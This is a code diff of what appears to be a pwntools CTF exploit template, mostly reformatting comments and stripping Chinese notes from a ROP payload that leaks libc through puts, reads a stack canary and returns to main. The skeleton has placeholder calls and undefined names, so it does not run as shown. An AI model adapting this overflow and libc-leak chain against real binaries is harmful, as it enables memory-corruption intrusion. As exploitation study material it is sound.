@@ -5,7 +5,7 @@
 from pwn import *
 from LibcSearcher import *
 
-raw_input() #暂时中断调试
+raw_input() # 暂时中断调试
 
 context.log_level = 'debug'
 context(log_level = 'debug', arch = 'amd64', os = 'linux')
@@ -21,11 +21,11 @@ puts_got = elf.got['puts']
 puts_plt = elf.plt['puts']
 fun_addr = elf.sym['function']
 
-leak_addr = int(p.recv(14),16)       #16进制转换
+leak_addr = int(p.recv(14),16)       # 16进制转换
 log.success('leak_addr:'+hex(leak))
-leak1 = u64(p.recv(6).ljust(8,'\x00'))    #左对齐 用 \x00 补齐
-canary = u32(p.recv(3).rjust(4, '\x00'))    #右对齐 用 \x00 补齐
-canary = u64(p.recv(7).rjust(8, '\x00'))    #右对齐 用 \x00 补齐
+leak1 = u64(p.recv(6).ljust(8,'\x00'))    # 左对齐 用 \x00 补齐
+canary = u32(p.recv(3).rjust(4, '\x00'))    # 右对齐 用 \x00 补齐
+canary = u64(p.recv(7).rjust(8, '\x00'))    # 右对齐 用 \x00 补齐
 
 libcsearcher = LibcSearcher('printf', printf_got_leak_addr)
 libcbase = printf_got_leak_addr - libcsearcher.dump('printf')
@@ -40,8 +40,8 @@ p.recvuntil()
 p.send()
 p.sendline()
 
-payload = 'a' * offset + p64(ret_addr) #利用偏移量溢出 在高版本的 ubuntu 会进行栈平衡检查 需要一个 ret 来使得栈平衡
-payload += p64(pop_rdi_ret) #劫持栈指针
-payload += p64(fun_got_offset)  #泄露 fun 的 got.plt 地址
-payload += p64(puts_plt_offset) #使用标准输出打印 fun_got_addr
-payload += p64(main_addr)   #回到 main 使程序重新开始
+payload = 'a' * offset + p64(ret_addr)
+payload += p64(pop_rdi_ret)
+payload += p64(fun_got_offset)
+payload += p64(puts_plt_offset)
+payload += p64(main_addr)
